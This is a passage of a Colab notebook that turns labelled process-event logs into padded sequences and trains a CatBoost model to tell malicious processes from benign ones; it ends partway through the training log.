              "  <svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "       width=\"24px\">\n",
              "    <path d=\"M0 0h24v24H0V0z\" fill=\"none\"/>\n",
              "    <path d=\"M18.56 5.44l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94zm-11 1L8.5 8.5l.94-2.06 2.06-.94-2.06-.94L8.5 2.5l-.94 2.06-2.06.94zm10 10l.94 2.06.94-2.06 2.06-.94-2.06-.94-.94-2.06-.94 2.06-2.06.94z\"/><path d=\"M17.41 7.96l-1.37-1.37c-.4-.4-.92-.59-1.43-.59-.52 0-1.04.2-1.43.59L10.3 9.45l-7.72 7.72c-.78.78-.78 2.05 0 2.83L4 21.41c.39.39.9.59 1.41.59.51 0 1.02-.2 1.41-.59l7.78-7.78 2.81-2.81c.8-.78.8-2.07 0-2.86zM5.41 20L4 18.59l7.72-7.72 1.47 1.35L5.41 20z\"/>\n",
              "  </svg>\n",
              "      </button>\n",
              "\n",
              "\n",
              "\n",
              "    <div id=\"df-45df7fa9-0d47-4cd8-88b6-81cc367d81e4\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-45df7fa9-0d47-4cd8-88b6-81cc367d81e4')\"\n",
              "              title=\"Suggest charts.\"\n",
              "              style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "    </div>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "    background-color: #E8F0FE;\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: #1967D2;\n",
              "    height: 32px;\n",
              "    padding: 0 0 0 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: #E2EBFA;\n",
              "    box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: #174EA6;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "    background-color: #3B4455;\n",
              "    fill: #D2E3FC;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart:hover {\n",
              "    background-color: #434B5C;\n",
              "    box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "    filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "    fill: #FFFFFF;\n",
              "  }\n",
              "</style>\n",
              "\n",
              "    <script>\n",
              "      async function quickchart(key) {\n",
              "        const containerElement = document.querySelector('#' + key);\n",
              "        const charts = await google.colab.kernel.invokeFunction(\n",
              "            'suggestCharts', [key], {});\n",
              "      }\n",
              "    </script>\n",
              "\n",
              "      <script>\n",
              "\n",
              "function displayQuickchartButton(domScope) {\n",
              "  let quickchartButtonEl =\n",
              "    domScope.querySelector('#df-45df7fa9-0d47-4cd8-88b6-81cc367d81e4 button.colab-df-quickchart');\n",
              "  quickchartButtonEl.style.display =\n",
              "    google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "}\n",
              "\n",
              "        displayQuickchartButton(document);\n",
              "      </script>\n",
              "      <style>\n",
              "    .colab-df-container {\n",
              "      display:flex;\n",
              "      flex-wrap:wrap;\n",
              "      gap: 12px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert {\n",
              "      background-color: #E8F0FE;\n",
              "      border: none;\n",
              "      border-radius: 50%;\n",
              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "      <script>\n",
              "        const buttonEl =\n",
              "          document.querySelector('#df-3a3ada38-8bae-4d71-a182-90baf4e2d49d button.colab-df-convert');\n",
              "        buttonEl.style.display =\n",
              "          google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "        async function convertToInteractive(key) {\n",
              "          const element = document.querySelector('#df-3a3ada38-8bae-4d71-a182-90baf4e2d49d');\n",
              "          const dataTable =\n",
              "            await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                     [key], {});\n",
              "          if (!dataTable) return;\n",
              "\n",
              "          const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "            '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "            + ' to learn more about interactive tables.';\n",
              "          element.innerHTML = '';\n",
              "          dataTable['output_type'] = 'display_data';\n",
              "          await google.colab.output.renderOutput(dataTable, element);\n",
              "          const docLink = document.createElement('div');\n",
              "          docLink.innerHTML = docLinkHtml;\n",
              "          element.appendChild(docLink);\n",
              "        }\n",
              "      </script>\n",
              "    </div>\n",
              "  </div>\n"
            ]
          },
          "metadata": {},
          "execution_count": 74
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "newdf.info()\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "QrXTIPeKgajz",
        "outputId": "08eeebd2-81f3-4f66-dec8-99da9c74110f"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "<class 'pandas.core.frame.DataFrame'>\n",
            "Int64Index: 3712 entries, 0 to 3711\n",
            "Data columns (total 7 columns):\n",
            " #   Column     Non-Null Count  Dtype \n",
            "---  ------     --------------  ----- \n",
            " 0   ProcessId  3712 non-null   int64 \n",
            " 1   binary     3712 non-null   object\n",
            " 2   EventID    3712 non-null   int8  \n",
            " 3   path       3712 non-null   object\n",
            " 4   unc_url    3712 non-null   int64 \n",
            " 5   b64        3712 non-null   int64 \n",
            " 6   network    3712 non-null   int64 \n",
            "dtypes: int64(4), int8(1), object(2)\n",
            "memory usage: 335.7+ KB\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "Сплит выборки"
      ],
      "metadata": {
        "id": "ZrBlMKtPPY-j"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "*проверочные данные*"
      ],
      "metadata": {
        "id": "Dvlpt4ErQGO3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "valid_lst = [10608, 10804, 10856, 10904, 11044, 11148, 11232, 1164, 1456, 1460, 1532, 1552, 1908, 1932, 1936, 2156, 2316, 2520, 2524, 2660, 2720, 2724, 2892, 2920, 2952, 3016, 3036, 3244, 3748, 3792, 4, 440, 4752, 4836, 5080, 5152, 5264, 5380, 5664, 5800, 5832, 6016, 6192, 6656, 672, 6796, 6808, 684, 6928, 7092, 7236, 7352, 7544, 7584, 7692, 7724, 7968, 8024, 8048, 8096, 8344, 8452, 8636, 8704, 8740, 8840, 8972, 9092, 9160, 9308, 9716, 9728, 9992]"
      ],
      "metadata": {
        "id": "wdIju3a4Ozhn"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "mal_lst = [10116, 10280, 11160, 1396, 1520, 1580, 2204, 2268, 3268, 4068, 4556, 6432, 7644, 8216, 8256, 9116, 9344, 9444, 9636, 976]"
      ],
      "metadata": {
        "id": "jfj86-RdO0wF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Импорт модулей"
      ],
      "metadata": {
        "id": "HjscPZx2QIC1"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.preprocessing import LabelEncoder, OneHotEncoder\n",
        "from sklearn.model_selection import train_test_split\n",
        "from tensorflow.keras.preprocessing.sequence import pad_sequences\n",
        "from datetime import datetime\n",
        "import numpy as np"
      ],
      "metadata": {
        "id": "vSPuRwKcQMVh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Дополнительная функция"
      ],
      "metadata": {
        "id": "2b1bp4fTRdZ3"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "MAX_TIMESTEPS = 128\n",
        "# number of features (except PID itself)\n",
        "N = len(newdf.columns) - 1\n",
        "\n",
        "def groupby_transform(dataframe, column):\n",
        "    global MAX_TIMESTEPS, N\n",
        "    total = len(dataframe.groupby(column))\n",
        "    start = datetime.now()\n",
        "    print(f\"Старт: {start}\")\n",
        "\n",
        "    print(f\"Всего категорий '{column}': '{total}'\")\n",
        "    print(f\"Уникальные значения: {dataframe[column].nunique()}\")\n",
        "\n",
        "    X = np.empty(shape=(0, MAX_TIMESTEPS, N)).astype(np.int16)\n",
        "    y = np.empty(shape=(0,1)).astype(np.int16)\n",
        "\n",
        "    binary_le = LabelEncoder().fit(['OTHER'] + list(dataframe['binary'].unique()))\n",
        "    path_le = LabelEncoder().fit(['OTHER'] + list(dataframe['path'].unique()))\n",
        "\n",
        "\n",
        "    try:\n",
        "        for i, (value, df) in enumerate(dataframe.groupby(column)):\n",
        "            # упрощение - пропуск менее 3 событий\n",
        "            if len(df) < 4:\n",
        "                continue\n",
        "\n",
        "            if value in valid_lst:\n",
        "                temp_y = np.array([0]).reshape(1,1)\n",
        "            elif value in mal_lst:\n",
        "                temp_y = np.array([1]).reshape(1,1)\n",
        "            else:\n",
        "                print(f'Неклассифицируемые ProcessID: {value}')\n",
        "                raise Exception\n",
        "\n",
        "            # Create 3D array\n",
        "            temp_X = np.hstack((\n",
        "                df[['EventID', 'unc_url', 'b64', 'network']].to_numpy(),\n",
        "                binary_le.transform(list(df['binary'])).reshape(-1,1),\n",
        "                path_le.transform(list(df['path'])).reshape(-1,1)\n",
        "            ))\n",
        "\n",
        "            # PADDING\n",
        "            temp_X = pad_sequences(temp_X.T, maxlen=MAX_TIMESTEPS).T\n",
        "\n",
        "            # adding this example to actual set\n",
        "            X = np.concatenate((X, temp_X.reshape(1, MAX_TIMESTEPS, N)))\n",
        "            y = np.concatenate((y, temp_y))\n",
        "\n",
        "        end = datetime.now()\n",
        "        print(f\"Конец: {end}\")\n",
        "        print(f\"Время выполнения сплита: {end - start}\")\n",
        "        return X, y\n",
        "\n",
        "    except KeyboardInterrupt:\n",
        "        end = datetime.now()\n",
        "        print(f\"Закончено:\\nитераций:{i}\\nвремя:{end}\")\n",
        "        print(f\"Время выполнения сплита: {end - start}\")\n",
        "        return X, y\n",
        "\n",
        "    except Exception as ex:\n",
        "        print(ex)\n",
        "        np.save(f'X{i}.npy', X)\n",
        "        np.save(f'y{i}.npy', y)"
      ],
      "metadata": {
        "id": "E_OFSLX8QrOd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "X, y = groupby_transform(newdf, 'ProcessId')"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "5hYPF3xIQrLk",
        "outputId": "f35107b5-bb46-49e7-acad-a1fedc67ac75"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Старт: 2023-08-12 11:54:12.262526\n",
            "Всего категорий 'ProcessId': '93'\n",
            "Уникальные значения: 93\n",
            "Конец: 2023-08-12 11:54:12.533243\n",
            "Время выполнения сплита: 0:00:00.270717\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "u, c = np.unique(y, return_counts=True)\n",
        "pos, neg = c\n",
        "pos, neg\n",
        "print(f\"Аномалии: {neg}\\nСработок: {pos}\")\n",
        "print(f\"Доля аномалий: {round(neg*100/(pos+neg),4)} %\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "q6uqcJGnQrIi",
        "outputId": "be9342dd-edd4-4e8f-9608-86600a9e5bca"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Аномалии: 19\n",
            "Сработок: 61\n",
            "Доля аномалий: 23.75 %\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "X.shape\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "H3jnuZmJQrFN",
        "outputId": "8fe8e91e-6afb-47f9-cc42-3bf76beb7182"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(80, 128, 6)"
            ]
          },
          "metadata": {},
          "execution_count": 82
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "train_X, val_X, train_y, val_y = train_test_split(X, y, test_size=0.2)\n",
        "print(train_X.shape)\n",
        "print(train_y.shape)\n",
        "print(val_X.shape)\n",
        "print(val_y.shape)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "iLKMrR3xSUeY",
        "outputId": "ab8790db-0f27-407f-a5bd-0a6de4e47fd5"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "(64, 128, 6)\n",
            "(64, 1)\n",
            "(16, 128, 6)\n",
            "(16, 1)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**KILLBoosts**"
      ],
      "metadata": {
        "id": "bRWEDP-COsgc"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install catboost"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "GDIvc8BrOw4T",
        "outputId": "d6edc1cb-8ccc-4aff-8f6e-dd9181c8b212"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: catboost in /usr/local/lib/python3.10/dist-packages (1.2)\n",
            "Requirement already satisfied: graphviz in /usr/local/lib/python3.10/dist-packages (from catboost) (0.20.1)\n",
            "Requirement already satisfied: matplotlib in /usr/local/lib/python3.10/dist-packages (from catboost) (3.7.1)\n",
            "Requirement already satisfied: numpy>=1.16.0 in /usr/local/lib/python3.10/dist-packages (from catboost) (1.23.5)\n",
            "Requirement already satisfied: pandas>=0.24 in /usr/local/lib/python3.10/dist-packages (from catboost) (1.5.3)\n",
            "Requirement already satisfied: scipy in /usr/local/lib/python3.10/dist-packages (from catboost) (1.10.1)\n",
            "Requirement already satisfied: plotly in /usr/local/lib/python3.10/dist-packages (from catboost) (5.15.0)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from catboost) (1.16.0)\n",
            "Requirement already satisfied: python-dateutil>=2.8.1 in /usr/local/lib/python3.10/dist-packages (from pandas>=0.24->catboost) (2.8.2)\n",
            "Requirement already satisfied: pytz>=2020.1 in /usr/local/lib/python3.10/dist-packages (from pandas>=0.24->catboost) (2023.3)\n",
            "Requirement already satisfied: contourpy>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (1.1.0)\n",
            "Requirement already satisfied: cycler>=0.10 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (0.11.0)\n",
            "Requirement already satisfied: fonttools>=4.22.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (4.42.0)\n",
            "Requirement already satisfied: kiwisolver>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (1.4.4)\n",
            "Requirement already satisfied: packaging>=20.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (23.1)\n",
            "Requirement already satisfied: pillow>=6.2.0 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (9.4.0)\n",
            "Requirement already satisfied: pyparsing>=2.3.1 in /usr/local/lib/python3.10/dist-packages (from matplotlib->catboost) (3.1.1)\n",
            "Requirement already satisfied: tenacity>=6.2.0 in /usr/local/lib/python3.10/dist-packages (from plotly->catboost) (8.2.2)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from catboost import CatBoostRegressor\n",
        "from catboost import Pool"
      ],
      "metadata": {
        "id": "tjTh3Gy-Ow1e"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "train_X_kill = train_X.reshape(train_X.shape[0], -1)\n",
        "val_X_kill = val_X.reshape(val_X.shape[0], -1)"
      ],
      "metadata": {
        "id": "80r_EML7W3ro"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model_cat = CatBoostRegressor(iterations=200, learning_rate=0.3, depth=4)"
      ],
      "metadata": {
        "id": "RSZLw9UrOwxQ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model_cat.fit(train_X_kill, train_y)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "A8ZfTRtMOwt8",
        "outputId": "9cdc25be-af08-4e0b-ab14-f02c7055fa3d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "0:\tlearn: 0.4194631\ttotal: 12.3ms\tremaining: 2.44s\n",
            "1:\tlearn: 0.3961721\ttotal: 21ms\tremaining: 2.07s\n",
            "2:\tlearn: 0.3735464\ttotal: 30.7ms\tremaining: 2.01s\n",
            "3:\tlearn: 0.3541292\ttotal: 39.6ms\tremaining: 1.94s\n",
            "4:\tlearn: 0.3422443\ttotal: 50.2ms\tremaining: 1.96s\n",
            "5:\tlearn: 0.3379724\ttotal: 58.8ms\tremaining: 1.9s\n",
            "6:\tlearn: 0.3309836\ttotal: 68.2ms\tremaining: 1.88s\n",
            "7:\tlearn: 0.3279592\ttotal: 77.8ms\tremaining: 1.87s\n",
            "8:\tlearn: 0.3184169\ttotal: 85.2ms\tremaining: 1.81s\n",
            "9:\tlearn: 0.3100820\ttotal: 94.5ms\tremaining: 1.79s\n",
            "10:\tlearn: 0.2836136\ttotal: 105ms\tremaining: 1.8s\n",
            "11:\tlearn: 0.2800812\ttotal: 115ms\tremaining: 1.8s\n",
            "12:\tlearn: 0.2678919\ttotal: 123ms\tremaining: 1.77s\n",
            "13:\tlearn: 0.2553398\ttotal: 131ms\tremaining: 1.74s\n",
            "14:\tlearn: 0.2441447\ttotal: 141ms\tremaining: 1.74s\n",
            "15:\tlearn: 0.2355910\ttotal: 151ms\tremaining: 1.74s\n",
            "16:\tlearn: 0.2336340\ttotal: 161ms\tremaining: 1.73s\n",
            "17:\tlearn: 0.2164113\ttotal: 174ms\tremaining: 1.76s\n",
            "18:\tlearn: 0.2087067\ttotal: 183ms\tremaining: 1.74s\n",
            "19:\tlearn: 0.2064350\ttotal: 193ms\tremaining: 1.74s\n",
            "20:\tlearn: 0.1991508\ttotal: 205ms\tremaining: 1.75s\n",
            "21:\tlearn: 0.1947853\ttotal: 214ms\tremaining: 1.73s\n",
            "22:\tlearn: 0.1858907\ttotal: 224ms\tremaining: 1.72s\n",
            "23:\tlearn: 0.1806606\ttotal: 234ms\tremaining: 1.71s\n",
            "24:\tlearn: 0.1734184\ttotal: 242ms\tremaining: 1.69s\n",
            "25:\tlearn: 0.1681105\ttotal: 251ms\tremaining: 1.68s\n",
            "26:\tlearn: 0.1623989\ttotal: 259ms\tremaining: 1.66s\n",
            "27:\tlearn: 0.1557529\ttotal: 269ms\tremaining: 1.65s\n",
            "28:\tlearn: 0.1516989\ttotal: 278ms\tremaining: 1.64s\n",
            "29:\tlearn: 0.1473472\ttotal: 287ms\tremaining: 1.63s\n",
            "30:\tlearn: 0.1393059\ttotal: 298ms\tremaining: 1.62s\n",
            "31:\tlearn: 0.1301190\ttotal: 318ms\tremaining: 1.67s\n",
            "32:\tlearn: 0.1267802\ttotal: 339ms\tremaining: 1.72s\n",
            "33:\tlearn: 0.1243235\ttotal: 359ms\tremaining: 1.75s\n",
            "34:\tlearn: 0.1197787\ttotal: 371ms\tremaining: 1.75s\n",
            "35:\tlearn: 0.1131035\ttotal: 381ms\tremaining: 1.74s\n",
            "36:\tlearn: 0.1112049\ttotal: 397ms\tremaining: 1.75s\n",
            "37:\tlearn: 0.1095130\ttotal: 408ms\tremaining: 1.74s\n",
            "38:\tlearn: 0.1080526\ttotal: 415ms\tremaining: 1.71s\n",
            "39:\tlearn: 0.1035530\ttotal: 422ms\tremaining: 1.69s\n",
            "40:\tlearn: 0.0977633\ttotal: 433ms\tremaining: 1.68s\n",
            "41:\tlearn: 0.0929659\ttotal: 442ms\tremaining: 1.66s\n",
            "42:\tlearn: 0.0885806\ttotal: 457ms\tremaining: 1.67s\n",
            "43:\tlearn: 0.0843953\ttotal: 476ms\tremaining: 1.69s\n",
            "44:\tlearn: 0.0816514\ttotal: 485ms\tremaining: 1.67s\n",
            "45:\tlearn: 0.0774582\ttotal: 493ms\tremaining: 1.65s\n",
            "46:\tlearn: 0.0744408\ttotal: 503ms\tremaining: 1.64s\n",
            "47:\tlearn: 0.0727743\ttotal: 514ms\tremaining: 1.63s\n",
            "48:\tlearn: 0.0701127\ttotal: 521ms\tremaining: 1.61s\n",
            "49:\tlearn: 0.0681040\ttotal: 531ms\tremaining: 1.59s\n",
            "50:\tlearn: 0.0656966\ttotal: 540ms\tremaining: 1.58s\n",
            "51:\tlearn: 0.0644014\ttotal: 550ms\tremaining: 1.56s\n",
            "52:\tlearn: 0.0622456\ttotal: 560ms\tremaining: 1.55s\n",
            "53:\tlearn: 0.0610813\ttotal: 570ms\tremaining: 1.54s\n",
            "54:\tlearn: 0.0591590\ttotal: 580ms\tremaining: 1.53s\n",
            "55:\tlearn: 0.0574824\ttotal: 599ms\tremaining: 1.54s\n",
            "56:\tlearn: 0.0557465\ttotal: 606ms\tremaining: 1.52s\n",
            "57:\tlearn: 0.0547881\ttotal: 614ms\tremaining: 1.5s\n",
            "58:\tlearn: 0.0522377\ttotal: 620ms\tremaining: 1.48s\n",
            "59:\tlearn: 0.0502982\ttotal: 628ms\tremaining: 1.46s\n",
            "60:\tlearn: 0.0484508\ttotal: 635ms\tremaining: 1.45s\n",
            "61:\tlearn: 0.0479465\ttotal: 643ms\tremaining: 1.43s\n",
            "62:\tlearn: 0.0461961\ttotal: 652ms\tremaining: 1.42s\n",
            "63:\tlearn: 0.0449867\ttotal: 659ms\tremaining: 1.4s\n",
            "64:\tlearn: 0.0446062\ttotal: 667ms\tremaining: 1.39s\n",
            "65:\tlearn: 0.0438276\ttotal: 676ms\tremaining: 1.37s\n",
            "66:\tlearn: 0.0422640\ttotal: 684ms\tremaining: 1.36s\n",
            "67:\tlearn: 0.0409232\ttotal: 691ms\tremaining: 1.34s\n",
            "68:\tlearn: 0.0398645\ttotal: 700ms\tremaining: 1.33s\n",
            "69:\tlearn: 0.0392473\ttotal: 711ms\tremaining: 1.32s\n",
            "70:\tlearn: 0.0377110\ttotal: 720ms\tremaining: 1.31s\n",
            "71:\tlearn: 0.0371677\ttotal: 738ms\tremaining: 1.31s\n",
            "72:\tlearn: 0.0360143\ttotal: 749ms\tremaining: 1.3s\n",
            "73:\tlearn: 0.0355167\ttotal: 758ms\tremaining: 1.29s\n",
            "74:\tlearn: 0.0339483\ttotal: 766ms\tremaining: 1.28s\n",
            "75:\tlearn: 0.0335092\ttotal: 777ms\tremaining: 1.27s\n",
            "76:\tlearn: 0.0325497\ttotal: 792ms\tremaining: 1.26s\n",
            "77:\tlearn: 0.0321476\ttotal: 799ms\tremaining: 1.25s\n",
            "78:\tlearn: 0.0313836\ttotal: 810ms\tremaining: 1.24s\n",
            "79:\tlearn: 0.0310265\ttotal: 818ms\tremaining: 1.23s\n",
            "80:\tlearn: 0.0303038\ttotal: 825ms\tremaining: 1.21s\n",
            "81:\tlearn: 0.0297597\ttotal: 838ms\tremaining: 1.21s\n",
            "82:\tlearn: 0.0287641\ttotal: 848ms\tremaining: 1.19s\n",
            "83:\tlearn: 0.0278287\ttotal: 856ms\tremaining: 1.18s\n",
            "84:\tlearn: 0.0272341\ttotal: 865ms\tremaining: 1.17s\n",
            "85:\tlearn: 0.0263869\ttotal: 873ms\tremaining: 1.16s\n",
            "86:\tlearn: 0.0261175\ttotal: 884ms\tremaining: 1.15s\n",
            "87:\tlearn: 0.0255573\ttotal: 891ms\tremaining: 1.13s\n",
            "88:\tlearn: 0.0247920\ttotal: 901ms\tremaining: 1.12s\n",
            "89:\tlearn: 0.0245421\ttotal: 912ms\tremaining: 1.11s\n",
            "90:\tlearn: 0.0238604\ttotal: 923ms\tremaining: 1.1s\n",
            "91:\tlearn: 0.0237416\ttotal: 937ms\tremaining: 1.1s\n",
            "92:\tlearn: 0.0236095\ttotal: 949ms\tremaining: 1.09s\n",
            "93:\tlearn: 0.0228318\ttotal: 964ms\tremaining: 1.09s\n",
            "94:\tlearn: 0.0225727\ttotal: 998ms\tremaining: 1.1s\n",
            "95:\tlearn: 0.0220616\ttotal: 1.04s\tremaining: 1.12s\n",
            "96:\tlearn: 0.0215943\ttotal: 1.05s\tremaining: 1.11s\n",
            "97:\tlearn: 0.0214274\ttotal: 1.06s\tremaining: 1.11s\n",
            "98:\tlearn: 0.0210644\ttotal: 1.08s\tremaining: 1.1s\n",
            "99:\tlearn: 0.0205881\ttotal: 1.11s\tremaining: 1.11s\n",
            "100:\tlearn: 0.0199701\ttotal: 1.15s\tremaining: 1.13s\n",
            "101:\tlearn: 0.0196691\ttotal: 1.17s\tremaining: 1.12s\n",
            "102:\tlearn: 0.0194329\ttotal: 1.19s\tremaining: 1.12s\n",
            "103:\tlearn: 0.0187310\ttotal: 1.2s\tremaining: 1.1s\n",
            "104:\tlearn: 0.0181672\ttotal: 1.2s\tremaining: 1.09s\n",
            "105:\tlearn: 0.0179771\ttotal: 1.21s\tremaining: 1.08s\n",
            "106:\tlearn: 0.0172979\ttotal: 1.22s\tremaining: 1.06s\n",
            "107:\tlearn: 0.0168888\ttotal: 1.23s\tremaining: 1.05s\n",
            "108:\tlearn: 0.0167159\ttotal: 1.24s\tremaining: 1.04s\n",
            "109:\tlearn: 0.0163943\ttotal: 1.25s\tremaining: 1.02s\n",
            "110:\tlearn: 0.0162468\ttotal: 1.26s\tremaining: 1.01s\n",
            "111:\tlearn: 0.0158025\ttotal: 1.28s\tremaining: 1s\n",
            "112:\tlearn: 0.0157467\ttotal: 1.29s\tremaining: 991ms\n",
            "113:\tlearn: 0.0155703\ttotal: 1.3s\tremaining: 978ms\n",
            "114:\tlearn: 0.0151808\ttotal: 1.31s\tremaining: 967ms\n",
            "115:\tlearn: 0.0147588\ttotal: 1.32s\tremaining: 957ms\n",
            "116:\tlearn: 0.0142397\ttotal: 1.33s\tremaining: 945ms\n",
            "117:\tlearn: 0.0138222\ttotal: 1.35s\tremaining: 935ms\n",
            "118:\tlearn: 0.0134758\ttotal: 1.38s\tremaining: 938ms\n",
            "119:\tlearn: 0.0134280\ttotal: 1.38s\tremaining: 922ms\n",
            "120:\tlearn: 0.0130918\ttotal: 1.39s\tremaining: 907ms\n",
            "121:\tlearn: 0.0126544\ttotal: 1.4s\tremaining: 892ms\n",
            "122:\tlearn: 0.0125710\ttotal: 1.4s\tremaining: 877ms\n",
            "123:\tlearn: 0.0119729\ttotal: 1.4s\tremaining: 861ms\n",
            "124:\tlearn: 0.0116569\ttotal: 1.41s\tremaining: 848ms\n",
            "125:\tlearn: 0.0116066\ttotal: 1.42s\tremaining: 836ms\n",
            "126:\tlearn: 0.0115694\ttotal: 1.43s\tremaining: 822ms\n",
            "127:\tlearn: 0.0113172\ttotal: 1.44s\tremaining: 808ms\n",
            "128:\tlearn: 0.0111748\ttotal: 1.44s\tremaining: 794ms\n",
            "129:\tlearn: 0.0107269\ttotal: 1.45s\tremaining: 780ms\n",
            "130:\tlearn: 0.0103328\ttotal: 1.46s\tremaining: 766ms\n",
            "131:\tlearn: 0.0101585\ttotal: 1.47s\tremaining: 760ms\n",
            "132:\tlearn: 0.0099869\ttotal: 1.49s\tremaining: 751ms\n",
            "133:\tlearn: 0.0097829\ttotal: 1.51s\tremaining: 744ms\n",
            "134:\tlearn: 0.0097032\ttotal: 1.52s\tremaining: 731ms\n",
            "135:\tlearn: 0.0096574\ttotal: 1.53s\tremaining: 719ms\n",
            "136:\tlearn: 0.0095527\ttotal: 1.54s\tremaining: 709ms\n",
            "137:\tlearn: 0.0093164\ttotal: 1.57s\tremaining: 705ms\n",
            "138:\tlearn: 0.0092835\ttotal: 1.58s\tremaining: 694ms\n",
            "139:\tlearn: 0.0090492\ttotal: 1.59s\tremaining: 682ms\n",
            "140:\tlearn: 0.0087546\ttotal: 1.6s\tremaining: 669ms\n",
            "141:\tlearn: 0.0085115\ttotal: 1.61s\tremaining: 657ms\n",
            "142:\tlearn: 0.0084477\ttotal: 1.63s\tremaining: 649ms\n",
            "143:\tlearn: 0.0082914\ttotal: 1.64s\tremaining: 637ms\n",
